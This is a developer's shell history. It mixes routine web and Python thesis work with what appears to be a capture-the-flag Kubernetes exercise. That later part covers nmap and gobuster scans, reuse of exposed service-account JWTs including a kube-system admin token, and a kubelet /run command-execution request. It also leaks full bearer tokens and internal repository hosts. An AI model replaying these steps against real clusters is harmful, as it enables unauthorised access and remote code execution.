+ 1902  git submodule init
+ 1903  git submodule update --remote 
+ 1904  yarn workspace webapp run develop:lab
+ 1905  git -C /Users/felipe/Desktop/projetos/nic/as-measurements-webapp remote remove origin
+ 1906  cd Desktop
+ 1907  ls
+ 1908  cd projetos
+ 1909  cd nic
+ 1910  rm -rf as-measurements-webapp
+ 1911  git clone  ssh://git@code.ceptro.br:7999/swfron/as-measurements-webapp.git --recursive
+ 1912  clear
+ 1913  ls
+ 1914  cd as-measurements-webapp
+ 1915  code .
+ 1916  exit
+ 1917  yarn 
+ 1918  yarn workspace webapp run develop:lab
+ 1919  clear
+ 1920  yarn workspace webapp run develop:lab
+ 1921  clear
+ 1922  yarn workspace webapp run develop:lab
+ 1923  cd ..
+ 1924  git clone ssh://git@code.ceptro.br:7999/swms/anomaly-detection-api.git
+ 1925  cd anomaly-detection-api
+ 1926  code .
+ 1927  yarn 
+ 1928  node -v
+ 1929  asdf global nodejs 14.20.1
+ 1930  yarn 
+ 1931  asdf global nodejs 16.18.0 
+ 1932  yarn 
+ 1933  asdf global nodejs 14.20.1
+ 1934  node -v
+ 1935  nod -v
+ 1936  node -v
+ 1937  asdf global nodejs 14.20.1
+ 1938  clear
+ 1939  node -v
+ 1940  cd Desktop/projetos/nic/isp-user-portal
+ 1941  lc
+ 1942  ear
+ 1943  clear
+ 1944  ls
+ 1945  node -v
+ 1946  nano .tool-versions
+ 1947  asdf global nodejs 14.20.1
+ 1948  l
+ 1949  node -v
+ 1950  yarn 
+ 1951  exit
+ 1952  kubectl
+ 1953  git pull
+ 1954  yarn workspace webapp run develop:lab
+ 1955  exit
+ 1956  clear
+ 1957  cd pro
+ 1958  cd Desktop/projetos/tcc
+ 1959  ls
+ 1960  cd ..
+ 1961  git clone https://github.com/N-Nieto/Inner_Speech_Dataset.git
+ 1962  cd Inner_Speech_Dataset
+ 1963  code .
+ 1964  git pull
+ 1965  clear
+ 1966  yarn 
+ 1967  yarn --help
+ 1968  yarn upgrade
+ 1969  yarn global add yarn-upgrade-all\n
+ 1970  yarn yarn-upgrade-all
+ 1971  eit
+ 1972  exit
+ 1973  yarn yarn-upgrade-all
+ 1974  yarn-upgrade-all
+ 1975  yarn yarn-upgra
+ 1976  yarn yarn-upgrade-all\n
+ 1977  yarn upgrade --latest
+ 1978  yarn outdated
+ 1979  yarn install --help
+ 1980  yarn outdated --json
+ 1981  clear
+ 1982  yarn outdated --json > outdate.json
+ 1983  exit
+ 1984  source /Users/felipe/Desktop/projetos/tcc/venv/bin/activate
+ 1985  python
+ 1986  source /Users/felipe/Desktop/projetos/tcc/venv/bin/activate
+ 1987  pwd
+ 1988  exit
+ 1989  source /Users/felipe/Desktop/projetos/tcc/venv/bin/activate
+ 1990  exit
+ 1991  source /Users/felipe/Desktop/projetos/tcc/venv/bin/activate
+ 1992  cd rede_neural
+ 1993  python main.py
+ 1994  cd ..
+ 1995  python -m rede_neural.main
+ 1996  python -m rede_neural.main.py
+ 1997  python -m rede_neural.main
+ 1998  cd ..
+ 1999  python -m tcc.rede_neural.main
+ 2000  clear
+ 2001  python -m tcc.rede_neural.main
+ 2002  clear
+ 2003  python -m tcc.rede_neural.main
+ 2004  clear
+ 2005  python -m tcc.rede_neural.main
+ 2006  source /Users/felipe/Desktop/projetos/tcc/venv/bin/activate
+ 2007  python -m tcc.rede_neural.main
+ 2008  cleare
+ 2009  clea
+ 2010  omz update
+ 2011  clear
+ 2012  exit
+ 2013  cd Desktop/projetos/tcc/
+ 2014  python -m tcc.rede_neural.main
+ 2015  source venv/bin/activate
+ 2016  clear
+ 2017  source venv/bin/activate
+ 2018  python -m tcc.rede_neural.main
+ 2019  ll
+ 2020  cd ..
+ 2021  python -m tcc.rede_neural.main
+ 2022  cd ..
+ 2023  cd projetos
+ 2024  python -m tcc.rede_neural.main
+ 2025  ls
+ 2026  mkdir tcc/checkpoint
+ 2027  cd tcc/checkpoint
+ 2028  pwd
+ 2029  cd ../../
+ 2030  clear
+ 2031  ls
+ 2032  python -m tcc.rede_neural.main
+ 2033  clear
+ 2034  python -m tcc.rede_neural.main
+ 2035  clear
+ 2036  cd tcc/Inner_Speech_Dataset/Python_Processing/
+ 2037  ls
+ 2038  pwd
+ 2039  source /Users/felipe/Desktop/projetos/tcc/venv/bin/activate
+ 2040  cd utils
+ 2041  python tese.py
+ 2042  cd ../../..
+ 2043  python -m tcc.rede_neural.main
+ 2044  clear
+ 2045  python -m tcc.rede_neural.main
+ 2046  clear
+ 2047  python -m tcc.rede_neural.main
+ 2048  clear
+ 2049  python -m tcc.rede_neural.main
+ 2050  pwd
+ 2051  cd tcc
+ 2052  mkdir model
+ 2053  clear
+ 2054  cd ..
+ 2055  python -m tcc.rede_neural.main
+ 2056  cd tcc
+ 2057  cd model
+ 2058  ls
+ 2059  ll
+ 2060  clear
+ 2061  ll
+ 2062  cd ..
+ 2063  python -m tcc.rede_neural.main
+ 2064  cd ~/Desktop
+ 2065  python
+ 2066  ping 10.10.157.68
+ 2067  clear
+ 2068  gobuster dir -u 10.10.157.68 -w ../Documents/wordlist/Discovery/Web-Content/big.txt
+ 2069  nmap 10.10.157.68 -sC -sV
+ 2070  nmap 10.10.92.234 -sC -sV 
+ 2071  kubectl --help
+ 2072  kubectl options
+ 2073  nano .zshrc
+ 2074  clear
+ 2075  export TOKEN=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjk4OTc3MjE3LCJpYXQiOjE2Njc0NDEyMTcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJqdW1wYm94LTZjNzU0OTQ3N2MtZGh0NGYiLCJ1aWQiOiJhY2MwYTcwNS1kY2UzLTQxYzItYmFiYy0xNmZmYjExOWM1MzkifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6Im5vZGVwcm94eSIsInVpZCI6IjVmZmZlOGI4LWIyOTYtNGQ2NS1iYzc4LTA2N2Y3MDg3YzNkYyJ9LCJ3YXJuYWZ0ZXIiOjE2Njc0NDQ4MjR9LCJuYmYiOjE2Njc0NDEyMTcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0Om5vZGVwcm94eSJ9.KoiWll7Cups9r1A9MQfl6MfZWFpZUbFExkpvWBTZighh2k3dXkN7VOVM-Dcx1uxzxQX8vo28UYeY4ipISEI0D9aNAwV9Viu9lE0HsM4eLNYydzWpkT_Nh8Szeck5jcpsdQ6RDAGt5oQO3b28vy_BO-Ri9yr_m27RydaXMmvJ6Lq3N8a6tJtFggtEWWb5q7_SztrT9-ENU7MLOy48mDhf5vI1OxwcslFNT7GeLtRy6ajIgfY6dFIxNjdSnCnJxOp42vbvsRlA9ojqLXAg4Fwoxh7GBZrcW6dnezo6sywDnx4qMuK83O_fnQ-MQON9DIHtCud7aTEP7kISR582prylOA
+ 2076  env | grep -i token
+ 2077  clear
+ 2078  ping TOKEN=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjk4OTc3MjE3LCJpYXQiOjE2Njc0NDEyMTcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJqdW1wYm94LTZjNzU0OTQ3N2MtZGh0NGYiLCJ1aWQiOiJhY2MwYTcwNS1kY2UzLTQxYzItYmFiYy0xNmZmYjExOWM1MzkifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6Im5vZGVwcm94eSIsInVpZCI6IjVmZmZlOGI4LWIyOTYtNGQ2NS1iYzc4LTA2N2Y3MDg3YzNkYyJ9LCJ3YXJuYWZ0ZXIiOjE2Njc0NDQ4MjR9LCJuYmYiOjE2Njc0NDEyMTcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0Om5vZGVwcm94eSJ9.KoiWll7Cups9r1A9MQfl6MfZWFpZUbFExkpvWBTZighh2k3dXkN7VOVM-Dcx1uxzxQX8vo28UYeY4ipISEI0D9aNAwV9Viu9lE0HsM4eLNYydzWpkT_Nh8Szeck5jcpsdQ6RDAGt5oQO3b28vy_BO-Ri9yr_m27RydaXMmvJ6Lq3N8a6tJtFggtEWWb5q7_SztrT9-ENU7MLOy48mDhf5vI1OxwcslFNT7GeLtRy6ajIgfY6dFIxNjdSnCnJxOp42vbvsRlA9ojqLXAg4Fwoxh7GBZrcW6dnezo6sywDnx4qMuK83O_fnQ-MQON9DIHtCud7aTEP7kISR582prylOA
+ 2079  ping http://10.10.92.234/
+ 2080  ping 10.10.92.234
+ 2081  ping 10.96.0.1
+ 2082  clear
+ 2083  export APISERVER=
+ 2084  export APISERVER=10.10.92.234:8443
+ 2085  clear
+ 2086  alias k='kubectl --token=$TOKEN --server=$APISERVER --insecure-skip-tls-verify=true'
+ 2087  k get all
+ 2088  cat $APIRSERVER
+ 2089  cat $APISERVER
+ 2090  echo $TOKEN
+ 2091  alias k='kubectl --token=$TOKEN --server=$APISERVER '
+ 2092  k
+ 2093  k get all
+ 2094  clear
+ 2095  alias k='kubectl --token=$TOKEN --server=$APISERVER --insecure-skip-tls-verify=true'
+ 2096  export TOKEN=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjk4OTgwMTE3LCJpYXQiOjE2Njc0NDQxMTcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJqdW1wYm94LTZjNzU0OTQ3N2MtZGh0NGYiLCJ1aWQiOiJhY2MwYTcwNS1kY2UzLTQxYzItYmFiYy0xNmZmYjExOWM1MzkifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6Im5vZGVwcm94eSIsInVpZCI6IjVmZmZlOGI4LWIyOTYtNGQ2NS1iYzc4LTA2N2Y3MDg3YzNkYyJ9LCJ3YXJuYWZ0ZXIiOjE2Njc0NDc3MjR9LCJuYmYiOjE2Njc0NDQxMTcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0Om5vZGVwcm94eSJ9.gNLL5LQqkvvwp4Hf2h13FGVmU2bvSCpw8c0tL-gJCw1SXD89rBWNrQeMqnlWXowTi7aaVemLt7iTHcAAYUHJPTtt6xQEijyFwTEvBUShabFa68jUtaf1oK42c2Twt_KrVCnLeXyns0EaXUd5qRN8R4hqqvSd31mNe1CuIEMxxOcvMOFhco_prmCteAUNk0uVJLIzbydY9ftuAlrddd9HBSgNLsLJyZXMTlN8L4lmGokpNAYIT_aUZDUVvcib5DF7JljGszYiZZs-9haCzyRXebjT0W7dI60_4Elo6gikQDtVEPLAVF0Ey7mu0J_L-quJQA26kj13IQK1fJulyZ8W9w
+ 2097  k get all
+ 2098  echo $APISERVER
+ 2099  export APISERVER=https://10.10.92.234:8443
+ 2100  k get all
+ 2101  k get pods 
+ 2102  k auth can-i --list
+ 2103  clear
+ 2104  k get pods -n kube-system
+ 2105  k get nodes -o wide
+ 2106  k get pods -n kube-system jump
+ 2107  source <(kubectl completion zsh)
+ 2108  nano .zshrc
+ 2109  echo '[[ $commands[kubectl] ]] && source <(kubectl completion zsh)' >> ~/.zshrc
+ 2110  k get pods -n 
+ 2111  k get nds
+ 2112  k get ns
+ 2113  k get pods -n kube-system
+ 2114  k get pods -n kube-system jumpbox-admin-7d56d4b67d-tcpt6 -o yaml | grep spec -A 10
+ 2115  curl -k -X POST -H "Authorization: Bearer $(cat token)" https://192.168.49.2:10250/run/kube-system/jump\nbox-admin-7d56d4b67d-tcpt6/ubuntu -d "cmd=id"
+ 2116  k get pods -n kube-system jumpbox-admin-7d56d4b67d-tcpt6 -o yaml 
+ 2117  k describe pods -n kube-system jumpbox-admin-7d56d4b67d-tcpt6 -o yaml 
+ 2118  k describe pods -n kube-system jumpbox-admin-7d56d4b67d-tcpt6 
+ 2119  k get pods -n kube-system jumpbox-admin-7d56d4b67d-tcpt6 -o yaml 
+ 2120  k get pods -n kube-system jumpbox-admin-7d56d4b67d-tcpt6 -o yaml | grep -i serviceaccountname
+ 2121  export TOKEN=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjk4OTgwMTQ3LCJpYXQiOjE2Njc0NDQxNDcsImlzcyI6Imh0dHBzOi8va3ViZXJuZX\nRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsInBvZCI6eyJuYW1lIjoianVtcGJveC1hZG1pbi03ZDU2ZDRiNjdkLXRjcHQ2IiwidWlkIjoiYjdhNjliYTAtOTJiZC00OTEzLWEwODctM2EwYjExMWQ1NzgyIn0sInNlcnZpY2VhY2NvdW5\n0Ijp7Im5hbWUiOiJhZG1pbiIsInVpZCI6ImY5MTI1N2ZjLWJmMjQtNGJiYS04OTZkLWZlYjdkOWM2NzU1MiJ9LCJ3YXJuYWZ0ZXIiOjE2Njc0NDc3NTR9LCJuYmYiOjE2Njc0NDQxNDcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDprdWJlLXN5c3RlbTphZG1pbiJ9.TmAsarF3Day5PR0pd3sbj35p9D2-YiE9bCZ\n_dlM2CueYfR-1eqzMOM5nRWl3mPEhkqhfgUzv49Fo-HqpsYP4qPqZQN_eziaO2BTLL1majPPSS8MPFvfJt-W8L0AYEosa3TDq_de4H9c2kTGQwH1sjhKX5Rf03uzG1cPziE_pfDYpJZZIEq3W4U50EOlzNPPIfpbxkF87Gnz68leedGyXdhwROdIr8tMJUntFLXAworqVHehOOO2aDtKoqb06eI1Lv4bvRn9NEf6--k4xOpA7\ngxovxDSj6Smjyx0-OPF-CkkYWqERBLyWjpYupkonfsVvfV29gNqrSO-V0-uXFNjFlg
+ 2122  export TOKEN=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjk4OTgwMTQ3LCJpYXQiOjE2Njc0NDQxNDcsImlzcyI6Imh0dHBzOi8va3ViZXJuZX\nRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsInBvZCI6eyJuYW1lIjoianVtcGJveC1hZG1pbi03ZDU2ZDRiNjdkLXRjcHQ2IiwidWlkIjoiYjdhNjliYTAtOTJiZC00OTEzLWEwODctM2EwYjExMWQ1NzgyIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJhZG1pbiIsInVpZCI6ImY5MTI1N2ZjLWJmMjQtNGJiYS04OTZkLWZlYjdkOWM2NzU1MiJ9LCJ3YXJuYWZ0ZXIiOjE2Njc0NDc3NTR9LCJuYmYiOjE2Njc0NDQxNDcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDprdWJlLXN5c3RlbTphZG1pbiJ9.TmAsarF3Day5PR0pd3sbj35p9D2-YiE9bCZ\n_dlM2CueYfR-1eqzMOM5nRWl3mPEhkqhfgUzv49Fo-HqpsYP4qPqZQN_eziaO2BTLL1majPPSS8MPFvfJt-W8L0AYEosa3TDq_de4H9c2kTGQwH1sjhKX5Rf03uzG1cPziE_pfDYpJZZIEq3W4U50EOlzNPPIfpbxkF87Gnz68leedGyXdhwROdIr8tMJUntFLXAworqVHehOOO2aDtKoqb06eI1Lv4bvRn9NEf6--k4xOpA7\ngxovxDSj6Smjyx0-OPF-CkkYWqERBLyWjpYupkonfsVvfV29gNqrSO-V0-uXFNjFlg
+ 2123  export TOKEN=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjk4OTgwMTQ3LCJpYXQiOjE2Njc0NDQxNDcsImlzcyI6Imh0dHBzOi8va3ViZXJuZX\nRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsInBvZCI6eyJuYW1lIjoianVtcGJveC1hZG1pbi03ZDU2ZDRiNjdkLXRjcHQ2IiwidWlkIjoiYjdhNjliYTAtOTJiZC00OTEzLWEwODctM2EwYjExMWQ1NzgyIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJhZG1pbiIsInVpZCI6ImY5MTI1N2ZjLWJmMjQtNGJiYS04OTZkLWZlYjdkOWM2NzU1MiJ9LCJ3YXJuYWZ0ZXIiOjE2Njc0NDc3NTR9LCJuYmYiOjE2Njc0NDQxNDcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDprdWJlLXN5c3RlbTphZG1pbiJ9.TmAsarF3Day5PR0pd3sbj35p9D2-YiE9bCZ\n_dlM2CueYfR-1eqzMOM5nRWl3mPEhkqhfgUzv49Fo-HqpsYP4qPqZQN_eziaO2BTLL1majPPSS8MPFvfJt-W8L0AYEosa3TDq_de4H9c2kTGQwH1sjhKX5Rf03uzG1cPziE_pfDYpJZZIEq3W4U50EOlzNPPIfpbxkF87Gnz68leedGyXdhwROdIr8tMJUntFLXAworqVHehOOO2aDtKoqb06eI1Lv4bvRn9NEf6--k4xOpA7gxovxDSj6Smjyx0-OPF-CkkYWqERBLyWjpYupkonfsVvfV29gNqrSO-V0-uXFNjFlg
+ 2124  k get ns
+ 2125  export TOKEN=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjk4OTgwMTE3LCJpYXQiOjE2Njc0NDQxMTcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJqdW1wYm94LTZjNzU0OTQ3N2MtZGh0NGYiLCJ1aWQiOiJhY2MwYTcwNS1kY2UzLTQxYzItYmFiYy0xNmZmYjExOWM1MzkifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6Im5vZGVwcm94eSIsInVpZCI6IjVmZmZlOGI4LWIyOTYtNGQ2NS1iYzc4LTA2N2Y3MDg3YzNkYyJ9LCJ3YXJuYWZ0ZXIiOjE2Njc0NDc3MjR9LCJuYmYiOjE2Njc0NDQxMTcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0Om5vZGVwcm94eSJ9.gNLL5LQqkvvwp4Hf2h13FGVmU2bvSCpw8c0tL-gJCw1SXD89rBWNrQeMqnlWXowTi7aaVemLt7iTHcAAYUHJPTtt6xQEijyFwTEvBUShabFa68jUtaf1oK42c2Twt_KrVCnLeXyns0EaXUd5qRN8R4hqqvSd31mNe1CuIEMxxOcvMOFhco_prmCteAUNk0uVJLIzbydY9ftuAlrddd9HBSgNLsLJyZXMTlN8L4lmGokpNAYIT_aUZDUVvcib5DF7JljGszYiZZs-9haCzyRXebjT0W7dI60_4Elo6gikQDtVEPLAVF0Ey7mu0J_L-quJQA26kj13IQK1fJulyZ8W9w
+ 2126  k get all
+ 2127  export TOKEN_ADMIN=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjk4OTgwMTE3LCJpYXQiOjE2Njc0NDQxMTcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJqdW1wYm94LTZjNzU0OTQ3N2MtZGh0NGYiLCJ1aWQiOiJhY2MwYTcwNS1kY2UzLTQxYzItYmFiYy0xNmZmYjExOWM1MzkifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6Im5vZGVwcm94eSIsInVpZCI6IjVmZmZlOGI4LWIyOTYtNGQ2NS1iYzc4LTA2N2Y3MDg3YzNkYyJ9LCJ3YXJuYWZ0ZXIiOjE2Njc0NDc3MjR9LCJuYmYiOjE2Njc0NDQxMTcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0Om5vZGVwcm94eSJ9.gNLL5LQqkvvwp4Hf2h13FGVmU2bvSCpw8c0tL-gJCw1SXD89rBWNrQeMqnlWXowTi7aaVemLt7iTHcAAYUHJPTtt6xQEijyFwTEvBUShabFa68jUtaf1oK42c2Twt_KrVCnLeXyns0EaXUd5qRN8R4hqqvSd31mNe1CuIEMxxOcvMOFhco_prmCteAUNk0uVJLIzbydY9ftuAlrddd9HBSgNLsLJyZXMTlN8L4lmGokpNAYIT_aUZDUVvcib5DF7JljGszYiZZs-9haCzyRXebjT0W7dI60_4Elo6gikQDtVEPLAVF0Ey7mu0J_L-quJQA26kj13IQK1fJulyZ8W9w
+ 2128  alias k_admin='kubectl --token=$TOKEN_ADMIN --server=$APISERVER --insecure-skip-tls-verify=true'
+ 2129  k_admin get ns
+ 2130  k_admin auth can-i --l
+ 2131  k_admin auth can-i --list
+ 2132  clear
+ 2133  epxort TOKEN_ADMIN=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjk4OTgwMTQ3LCJpYXQiOjE2Njc0NDQxNDcsImlzcyI6Imh0dHBzOi8va3ViZXJuZX\nRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsInBvZCI6eyJuYW1lIjoianVtcGJveC1hZG1pbi03ZDU2ZDRiNjdkLXRjcHQ2IiwidWlkIjoiYjdhNjliYTAtOTJiZC00OTEzLWEwODctM2EwYjExMWQ1NzgyIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJhZG1pbiIsInVpZCI6ImY5MTI1N2ZjLWJmMjQtNGJiYS04OTZkLWZlYjdkOWM2NzU1MiJ9LCJ3YXJuYWZ0ZXIiOjE2Njc0NDc3NTR9LCJuYmYiOjE2Njc0NDQxNDcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDprdWJlLXN5c3RlbTphZG1pbiJ9.TmAsarF3Day5PR0pd3sbj35p9D2-YiE9bCZ_dlM2CueYfR-1eqzMOM5nRWl3mPEhkqhfgUzv49Fo-HqpsYP4qPqZQN_eziaO2BTLL1majPPSS8MPFvfJt-W8L0AYEosa3TDq_de4H9c2kTGQwH1sjhKX5Rf03uzG1cPziE_pfDYpJZZIEq3W4U50EOlzNPPIfpbxkF87Gnz68leedGyXdhwROdIr8tMJUntFLXAworqVHehOOO2aDtKoqb06eI1Lv4bvRn9NEf6--k4xOpA7gxovxDSj6Smjyx0-OPF-CkkYWqERBLyWjpYupkonfsVvfV29gNqrSO-V0-uXFNjFlg
+ 2134  export TOKEN_ADMIN=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjk4OTgwMTQ3LCJpYXQiOjE2Njc0NDQxNDcsImlzcyI6Imh0dHBzOi8va3ViZXJuZX\nRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsInBvZCI6eyJuYW1lIjoianVtcGJveC1hZG1pbi03ZDU2ZDRiNjdkLXRjcHQ2IiwidWlkIjoiYjdhNjliYTAtOTJiZC00OTEzLWEwODctM2EwYjExMWQ1NzgyIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJhZG1pbiIsInVpZCI6ImY5MTI1N2ZjLWJmMjQtNGJiYS04OTZkLWZlYjdkOWM2NzU1MiJ9LCJ3YXJuYWZ0ZXIiOjE2Njc0NDc3NTR9LCJuYmYiOjE2Njc0NDQxNDcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDprdWJlLXN5c3RlbTphZG1pbiJ9.TmAsarF3Day5PR0pd3sbj35p9D2-YiE9bCZ_dlM2CueYfR-1eqzMOM5nRWl3mPEhkqhfgUzv49Fo-HqpsYP4qPqZQN_eziaO2BTLL1majPPSS8MPFvfJt-W8L0AYEosa3TDq_de4H9c2kTGQwH1sjhKX5Rf03uzG1cPziE_pfDYpJZZIEq3W4U50EOlzNPPIfpbxkF87Gnz68leedGyXdhwROdIr8tMJUntFLXAworqVHehOOO2aDtKoqb06eI1Lv4bvRn9NEf6--k4xOpA7gxovxDSj6Smjyx0-OPF-CkkYWqERBLyWjpYupkonfsVvfV29gNqrSO-V0-uXFNjFlg
+ 2135  export TOKEN_ADMIN=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjk4OTgwMTQ3LCJpYXQiOjE2Njc0NDQxNDcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsInBvZCI6eyJuYW1lIjoianVtcGJveC1hZG1pbi03ZDU2ZDRiNjdkLXRjcHQ2IiwidWlkIjoiYjdhNjliYTAtOTJiZC00OTEzLWEwODctM2EwYjExMWQ1NzgyIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJhZG1pbiIsInVpZCI6ImY5MTI1N2ZjLWJmMjQtNGJiYS04OTZkLWZlYjdkOWM2NzU1MiJ9LCJ3YXJuYWZ0ZXIiOjE2Njc0NDc3NTR9LCJuYmYiOjE2Njc0NDQxNDcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDprdWJlLXN5c3RlbTphZG1pbiJ9.TmAsarF3Day5PR0pd3sbj35p9D2-YiE9bCZ_dlM2CueYfR-1eqzMOM5nRWl3mPEhkqhfgUzv49Fo-HqpsYP4qPqZQN_eziaO2BTLL1majPPSS8MPFvfJt-W8L0AYEosa3TDq_de4H9c2kTGQwH1sjhKX5Rf03uzG1cPziE_pfDYpJZZIEq3W4U50EOlzNPPIfpbxkF87Gnz68leedGyXdhwROdIr8tMJUntFLXAworqVHehOOO2aDtKoqb06eI1Lv4bvRn9NEf6--k4xOpA7gxovxDSj6Smjyx0-OPF-CkkYWqERBLyWjpYupkonfsVvfV29gNqrSO-V0-uXFNjFlg
+ 2136  clear
+ 2137  k_admin auth can-i --list
